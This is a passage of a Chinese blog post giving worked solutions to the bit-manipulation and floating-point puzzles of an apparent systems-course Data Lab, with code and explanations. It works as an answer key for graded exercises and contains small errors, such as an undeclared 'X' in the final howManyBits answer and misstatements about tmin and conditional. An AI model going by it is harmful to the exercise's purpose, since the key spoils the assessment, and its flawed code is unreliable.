~(~(~x&amp;y)&amp;~(x&amp;~y));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="tmin"><a href="#tmin" class="headerlink" title="tmin"></a>tmin</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * tmin - return minimum two&#x27;s complement integer </span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 4</span></span><br><span class="line"><span class="comment"> *   Rating: 1</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">tmin</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>获得整数的最小值，最小值就是我们喜闻乐见的 <code>-2147483648</code> 啦，但是我们稍微转换一下思路，最小就是最高位一个0，用个 <code>1</code>，然后移位运算把它移到最高位即可。</p><h4 id="答案-1"><a href="#答案-1" class="headerlink" title="答案"></a>答案</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">tmin</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>&lt;&lt;<span class="number">31</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="isTmax"><a href="#isTmax" class="headerlink" title="isTmax"></a>isTmax</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * isTmax - returns 1 if x is the maximum, two&#x27;s complement number,</span></span><br><span class="line"><span class="comment"> *     and 0 otherwise </span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | +</span></span><br><span class="line"><span class="comment"> *   Max ops: 10</span></span><br><span class="line"><span class="comment"> *   Rating: 1</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">isTmax</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>判断 <code>x</code> 是否为最大值，最大值应该是最小值取反，然后判断是否一样我们使用异或运算，异或只有在两边相等时才返回 <code>0</code>，我们用非运算符反一下就可以了。</p><h4 id="答案-2"><a href="#答案-2" class="headerlink" title="答案"></a>答案</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">isTmax</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> !((~(<span class="number">1</span>&lt;&lt;<span class="number">31</span>))^x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="allOddBits"><a href="#allOddBits" class="headerlink" title="allOddBits"></a>allOddBits</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * allOddBits - return 1 if all odd-numbered bits in word set to 1</span></span><br><span class="line"><span class="comment"> *   where bits are numbered from 0 (least significant) to 31 (most significant)</span></span><br><span class="line"><span class="comment"> *   Examples allOddBits(0xFFFFFFFD) = 0, allOddBits(0xAAAAAAAA) = 1</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 12</span></span><br><span class="line"><span class="comment"> *   Rating: 2</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">allOddBits</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>判断 <code>x</code> 是否奇数位上全为 <code>1</code>。全 <code>1</code> 我们直接用一个立即数好了 <code>0xAAAAAAAA</code>，然后与屏蔽偶数位之后判断是否相等即可。</p><h4 id="答案-3"><a href="#答案-3" class="headerlink" title="答案"></a>答案</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">allOddBits</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> !((<span class="number">0xAAAAAAAA</span>&amp;x)^<span class="number">0xAAAAAAAA</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="negate"><a href="#negate" class="headerlink" title="negate"></a>negate</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * negate - return -x </span></span><br><span class="line"><span class="comment"> *   Example: negate(1) = -1.</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 5</span></span><br><span class="line"><span class="comment"> *   Rating: 2</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">negate</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实现对一个数取负，取负的话就是取反再加一即可。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">negate</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> ~x+<span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="isAsciiDigit"><a href="#isAsciiDigit" class="headerlink" title="isAsciiDigit"></a>isAsciiDigit</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * isAsciiDigit - return 1 if 0x30 &lt;= x &lt;= 0x39 (ASCII codes for characters &#x27;0&#x27; to &#x27;9&#x27;)</span></span><br><span class="line"><span class="comment"> *   Example: isAsciiDigit(0x35) = 1.</span></span><br><span class="line"><span class="comment"> *            isAsciiDigit(0x3a) = 0.</span></span><br><span class="line"><span class="comment"> *            isAsciiDigit(0x05) = 0.</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 15</span></span><br><span class="line"><span class="comment"> *   Rating: 3</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">isAsciiDigit</span><span class="params">(<span class="keyword">int</span> x)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>判断一个整数是否在 <code>ASCII</code> 码的数字位置，再转换一下就是满足这个条件：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x<span class="number">-0x30</span>&gt;=<span class="number">0</span>  &amp;&amp; x<span class="number">-0x3a</span>&lt;<span class="number">0</span></span><br></pre></td></tr></table></figure><p>我们的目标就是判断 <code>x-0x30</code> 是否为非负数，<code>x-0x3a</code> 是否为负数，也许需要考虑溢出，但是结果发现不需要，因为这个是两边判断的。</p><h4 id="答案-4"><a href="#答案-4" class="headerlink" title="答案"></a>答案</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">isAsciiDigit</span><span class="params">(<span class="keyword">int</span> x)</span></span>&#123;<span class="comment">//x-0x30&gt;=0  &amp;&amp; x-0x3a&lt;0</span></span><br><span class="line"><span class="keyword">return</span> !((x+(~<span class="number">0x30</span>+<span class="number">1</span>))&amp;(<span class="number">1</span>&lt;&lt;<span class="number">31</span>))&amp;!!((x+(~<span class="number">0x3a</span>+<span class="number">1</span>))&amp;(<span class="number">1</span>&lt;&lt;<span class="number">31</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="conditional"><a href="#conditional" class="headerlink" title="conditional"></a>conditional</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * conditional - same as x ? y : z </span></span><br><span class="line"><span class="comment"> *   Example: conditional(2,4,5) = 4</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 16</span></span><br><span class="line"><span class="comment"> *   Rating: 3</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">conditional</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y, <span class="keyword">int</span> z)</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>相当于实现运算 <code>x?y:z</code>，如果 <code>x</code> 为 <code>0</code> 则返回 <code>x</code>，如果不为 <code>0</code> 则返回 <code>y</code>。</p><p>我们先把 <code>x</code>取值变为只有 <code>0</code> 和 <code>-1</code>。用掩码的思路，如过结果为 <code>-1</code> 则说明位模式全为 <code>1</code>，相与的结果就是另一个数本身，如果是 <code>0</code> 则不论与谁结果都是 <code>0</code>，我们让 <code>x</code> 与 <code>y</code>，让 <code>~x</code> 与 <code>z</code>，最后得到的两个值或起来即可。<code>x</code> 如果是 <code>-1</code> 则返回 <code>y</code> ，如果是 <code>0</code> 则返回 <code>z</code>。得到 <code>x</code> 我们只要非两次，再取负即可，就达到了我们的要求了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">conditional</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y, <span class="keyword">int</span> z)</span> </span>&#123;</span><br><span class="line">x=~(!!x)+<span class="number">1</span>;</span><br><span class="line"><span class="keyword">return</span> (x&amp;y)|(~x&amp;z);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="isLessOrEqual"><a href="#isLessOrEqual" class="headerlink" title="isLessOrEqual"></a>isLessOrEqual</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * isLessOrEqual - if x &lt;= y  then return 1, else return 0 </span></span><br><span class="line"><span class="comment"> *   Example: isLessOrEqual(4,5) = 1.</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 24</span></span><br><span class="line"><span class="comment"> *   Rating: 3</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">isLessOrEqual</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实现一个小于等于的功能，这里需要注意的是不能直接相减，会有溢出。</p><p>因此我们选择先判断符号位，符号位一致再相减一定不会溢出，符号不一致则强行返回不一致的结果，一致则返回直接相减的结果。首先我们先拿两个变量保存符号的结果，然后再判断符号是否一致，一致则屏蔽符号的结果，不一致则屏蔽相减的结果。</p><p>这里好好再理解一下，仔细看 <code>signx^signy</code> 和 <code>!(signx^signy)</code> 如何起到屏蔽答案的效果。</p><h4 id="答案-5"><a href="#答案-5" class="headerlink" title="答案"></a>答案</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">isLessOrEqual</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>&#123;<span class="comment">//y-x&gt;=0</span></span><br><span class="line">    <span class="keyword">int</span> signx=!(x&amp;(<span class="number">1</span>&lt;&lt;<span class="number">31</span>));</span><br><span class="line">    <span class="keyword">int</span> signy=!(y&amp;(<span class="number">1</span>&lt;&lt;<span class="number">31</span>));</span><br><span class="line">    <span class="keyword">int</span> sign=(signx^signy)&amp;signy;<span class="comment">//若不一致则返回y是否为非负数</span></span><br><span class="line">    x=x&amp;<span class="number">0x7fffffff</span>;</span><br><span class="line">    y=y&amp;<span class="number">0x7fffffff</span>;</span><br><span class="line">    <span class="keyword">return</span> sign|(!(((y+(~x+<span class="number">1</span>))&amp;(<span class="number">1</span>&lt;&lt;<span class="number">31</span>))))&amp;(!(signx^signy));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="logicalNeg"><a href="#logicalNeg" class="headerlink" title="logicalNeg"></a>logicalNeg</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * logicalNeg - implement the ! operator, using all of </span></span><br><span class="line"><span class="comment"> *              the legal operators except !</span></span><br><span class="line"><span class="comment"> *   Examples: logicalNeg(3) = 0, logicalNeg(0) = 1</span></span><br><span class="line"><span class="comment"> *   Legal ops: ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 12</span></span><br><span class="line"><span class="comment"> *   Rating: 4 </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">logicalNeg</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实现逻辑非的功能，我们这里需要研究一下 <code>0</code> 的特性，<code>0</code> 是除了 <code>TMIN</code> 以外的负数值等于自己本身的数了。然后再判断一下最高位即可。</p><h4 id="答案-6"><a href="#答案-6" class="headerlink" title="答案"></a>答案</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">logicalNeg</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> ((x|(~x+<span class="number">1</span>))&gt;&gt;<span class="number">31</span>)+<span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="howManyBits"><a href="#howManyBits" class="headerlink" title="howManyBits"></a>howManyBits</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* howManyBits - return the minimum number of bits required to represent x in</span></span><br><span class="line"><span class="comment"> *             two&#x27;s complement</span></span><br><span class="line"><span class="comment"> *  Examples: howManyBits(12) = 5</span></span><br><span class="line"><span class="comment"> *            howManyBits(298) = 10</span></span><br><span class="line"><span class="comment"> *            howManyBits(-5) = 4</span></span><br><span class="line"><span class="comment"> *            howManyBits(0)  = 1</span></span><br><span class="line"><span class="comment"> *            howManyBits(-1) = 1</span></span><br><span class="line"><span class="comment"> *            howManyBits(0x80000000) = 32</span></span><br><span class="line"><span class="comment"> *  Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *  Max ops: 90</span></span><br><span class="line"><span class="comment"> *  Rating: 4</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">howManyBits</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这题挺难的，首先要想到一个二分，然后要注意正数需要多一位，负数不需要。假如我给了你 <code>0x7fffffff</code>，那么你肯定要 <code>32</code> 位，虽然我只有 <code>31</code> 位有效数字。我给你个 <code>-1</code> 那一位就够了，因为一位的范围就是 <code>-1~0</code>。</p><p>我们先判断高 <code>16</code> 位是否有 <code>1</code>，若有则判断高 <code>16</code> 位，答案加上 <code>16</code>，否则判断低 <code>16</code> 位。</p><p>再判断的 <code>16</code> 位中，判断高 <code>8</code> 位是否有 <code>1</code>，若有则继续判断高 <code>8</code> 位，答案加上<code>8</code>，否则判断低 <code>8</code> 位。</p><p>直到判完。我一开始想到了这个：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">howManyBits</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> sign=!(&gt;&gt;<span class="number">31</span>); </span><br><span class="line"><span class="keyword">int</span> b16=(!!((x&gt;&gt;<span class="number">16</span>)&amp;<span class="number">0xffff</span>))&lt;&lt;<span class="number">4</span>;</span><br><span class="line">x=x&gt;&gt;b16;</span><br><span class="line">x=x&amp;<span class="number">0xffff</span>;</span><br><span class="line"><span class="keyword">int</span> b8=(!!((x&gt;&gt;<span class="number">8</span>)&amp;<span class="number">0xff</span>))&lt;&lt;<span class="number">3</span>;</span><br><span class="line">x=x&gt;&gt;b8;</span><br><span class="line"><span class="keyword">int</span> b4=(!!((x&gt;&gt;<span class="number">4</span>)&amp;<span class="number">0xf</span>))&lt;&lt;<span class="number">2</span>;</span><br><span class="line">x=x&gt;&gt;b4;</span><br><span class="line"><span class="keyword">int</span> b2=(!!((x&gt;&gt;<span class="number">2</span>)&amp;<span class="number">0x3</span>))&lt;&lt;<span class="number">1</span>;</span><br><span class="line">x=x&gt;&gt;b2;</span><br><span class="line"><span class="keyword">int</span> b1=(!!((x&gt;&gt;<span class="number">1</span>)&amp;<span class="number">0x1</span>))&lt;&lt;<span class="number">0</span>;</span><br><span class="line">x=x&gt;&gt;b1;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d %d %d %d %d %d %d\n&quot;</span>,b16,b8,b4,b2,b1,x,sign);</span><br><span class="line"><span class="keyword">return</span> b16+b8+b4+b2+b1+sign+x;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是经过多方调试还是输给了 <code>-1</code> 这个测试点。后来想到如果负数则取反即可，然后符号位就默认给它加着上去即可。</p><h4 id="答案-7"><a href="#答案-7" class="headerlink" title="答案"></a>答案</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">howManyBits</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> sign=x&gt;&gt;<span class="number">31</span>;</span><br><span class="line">x = (sign&amp;~x)|(~sign&amp;x);</span><br><span class="line"><span class="keyword">int</span> b16=(!!((x&gt;&gt;<span class="number">16</span>)&amp;<span class="number">0xffff</span>))&lt;&lt;<span class="number">4</span>;</span><br><span class="line">x=x&gt;&gt;b16;</span><br><span class="line">x=x&amp;<span class="number">0xffff</span>;</span><br><span class="line"><span class="keyword">int</span> b8=(!!((x&gt;&gt;<span class="number">8</span>)&amp;<span class="number">0xff</span>))&lt;&lt;<span class="number">3</span>;</span><br><span class="line">x=x&gt;&gt;b8;</span><br><span class="line"><span class="keyword">int</span> b4=(!!((x&gt;&gt;<span class="number">4</span>)&amp;<span class="number">0xf</span>))&lt;&lt;<span class="number">2</span>;</span><br><span class="line">x=x&gt;&gt;b4;</span><br><span class="line"><span class="keyword">int</span> b2=(!!((x&gt;&gt;<span class="number">2</span>)&amp;<span class="number">0x3</span>))&lt;&lt;<span class="number">1</span>;</span><br><span class="line">x=x&gt;&gt;b2;</span><br><span class="line"><span class="keyword">int</span> b1=(!!((x&gt;&gt;<span class="number">1</span>)&amp;<span class="number">0x1</span>))&lt;&lt;<span class="number">0</span>;</span><br><span class="line">x=x&gt;&gt;b1;</span><br><span class="line"><span class="keyword">return</span> b16+b8+b4+b2+b1+X+<span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>整数阶段到此完结了就。</p><h3 id="floatScale2"><a href="#floatScale2" class="headerlink" title="floatScale2"></a>floatScale2</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * floatScale2 - Return bit-level equivalent of expression 2*f for</span></span><br><span class="line"><span class="comment"> *   floating point argument f.</span></span><br><span class="line"><span class="comment"> *   Both the argument and result are passed as unsigned int&#x27;s, but</span></span><br><span class="line"><span class="comment"> *   they are to be interpreted as the bit-level representation of</span></span><br><span class="line"><span class="comment"> *   single-precision floating point values.</span></span><br><span class="line"><span class="comment"> *   When argument is NaN, return argument</span></span><br><span class="line"><span class="comment"> *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while</span></span><br><span class="line"><span class="comment"> *   Max ops: 30</span></span><br><span class="line"><span class="comment"> *   Rating: 4</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="title">floatScale2</span><span class="params">(<span class="keyword">unsigned</span> uf)</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>就是返回一个浮点数乘 <code>2</code>。首先排除掉那些特殊值： <code>NAN，INF</code> 和 <code>0</code>，乘二返回指数 <code>+1</code> 即可，</p><h4 id="答案-8"><a href="#答案-8" class="headerlink" title="答案"></a>答案</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="title">floatScale2</span><span class="params">(<span class="keyword">unsigned</span> uf)</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> <span class="built_in">exp</span> = (uf&amp;<span class="number">0x7f800000</span>)&gt;&gt;<span class="number">23</span>;</span><br><span class="line"><span class="keyword">int</span> sign = uf&amp;(<span class="number">1</span>&lt;&lt;<span class="number">31</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">exp</span>==<span class="number">0</span>) <span class="keyword">return</span> uf&lt;&lt;<span class="number">1</span>|sign;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">exp</span>==<span class="number">255</span>) <span class="keyword">return</span> uf;</span><br><span class="line"><span class="built_in">exp</span>++;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">exp</span>==<span class="number">255</span>) <span class="keyword">return</span> <span class="number">0x7f800000</span>|sign;</span><br><span class="line"><span class="keyword">return</span> (<span class="built_in">exp</span>&lt;&lt;<span class="number">23</span>)|(uf&amp;<span class="number">0x807fffff</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="floatFloat2Int"><a href="#floatFloat2Int" class="headerlink" title="floatFloat2Int"></a>floatFloat2Int</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * floatFloat2Int - Return bit-level equivalent of expression (int) f</span></span><br><span class="line"><span class="comment"> *   for floating point argument f.</span></span><br><span class="line"><span class="comment"> *   Argument is passed as unsigned int, but</span></span><br><span class="line"><span class="comment"> *   it is to be interpreted as the bit-level representation of a</span></span><br><span class="line"><span class="comment"> *   single-precision floating point value.</span></span><br><span class="line"><span class="comment"> *   Anything out of range (including NaN and infinity) should return</span></span><br><span class="line"><span class="comment"> *   0x80000000u.</span></span><br><span class="line"><span class="comment"> *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while</span></span><br><span class="line"><span class="comment"> *   Max ops: 30</span></span><br><span class="line"><span class="comment"> *   Rating: 4</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">floatFloat2Int</span><span class="params">(<span class="keyword">unsigned</span> uf)</span> </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实现一个类似是强制转换的东西吧，首先还是按照浮点数的规则把各个字段提取出来，然后特判移位就行了。</p><h4 id="答案-9"><a href="#答案-9" class="headerlink" title="答案"></a>答案</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">floatFloat2Int</span><span class="params">(<span class="keyword">unsigned</span> uf)</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> s=uf&gt;&gt;<span class="number">31</span>;</span><br><span class="line"><span class="keyword">int</span> <span 